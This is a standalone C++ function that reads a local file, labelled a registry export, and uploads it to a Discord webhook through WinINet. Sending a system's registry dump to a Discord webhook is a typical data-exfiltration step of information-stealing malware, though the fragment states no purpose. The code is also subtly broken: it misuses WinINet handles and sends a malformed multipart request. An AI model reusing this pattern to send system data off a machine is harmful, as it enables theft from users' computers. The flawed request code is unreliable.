void SendToDiscordWebhook(const std::string& webhookURL, const std::string& filePath) {
    HINTERNET hInternet = InternetOpenA("HTTPGET", INTERNET_OPEN_TYPE_DIRECT, nullptr, nullptr, 0);
    if (hInternet == NULL) {
        std::cerr << "Failed to initialize WinINet!" << std::endl;
        return;
    }

    HINTERNET hConnect = InternetOpenUrlA(hInternet, webhookURL.c_str(), nullptr, 0, INTERNET_FLAG_RELOAD, 0);
    if (hConnect == NULL) {
        std::cerr << "Failed to establish connection to Discord webhook!" << std::endl;
        InternetCloseHandle(hInternet);
        return;
    }

    // Uploading the file to Discord webhook
    std::string payload = "--boundary\r\n"
                          "Content-Disposition: form-data; name=\"file\"; filename=\"registry_export.txt\"\r\n"
                          "Content-Type: application/octet-stream\r\n\r\n";
    std::ifstream file(filePath, std::ios::binary);
    if (!file) {
        std::cerr << "Failed to open export file for sending!" << std::endl;
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return;
    }
    payload += std::string(std::istreambuf_iterator<char>(file), {});

    std::string requestHeaders = "Content-Type: multipart/form-data; boundary=boundary\r\n";

    DWORD payloadLength = payload.length();
    requestHeaders += "Content-Length: " + std::to_string(payloadLength) + "\r\n\r\n";

    DWORD headerLength = requestHeaders.length();

    DWORD postSize = headerLength + payloadLength;

    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", nullptr, nullptr, nullptr, nullptr, INTERNET_FLAG_RELOAD, 0);
    if (hRequest == NULL) {
        std::cerr << "Failed to open HTTP request!" << std::endl;
        file.close();
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return;
    }

    if (HttpSendRequestA(hRequest, requestHeaders.c_str(), headerLength, (void*)payload.c_str(), payloadLength) == FALSE) {
        std::cerr << "Failed to send HTTP request!" << std::endl;
        file.close();
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return;
    }

    std::cout << "Registry export sent to Discord successfully!" << std::endl;

    file.close();
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
}

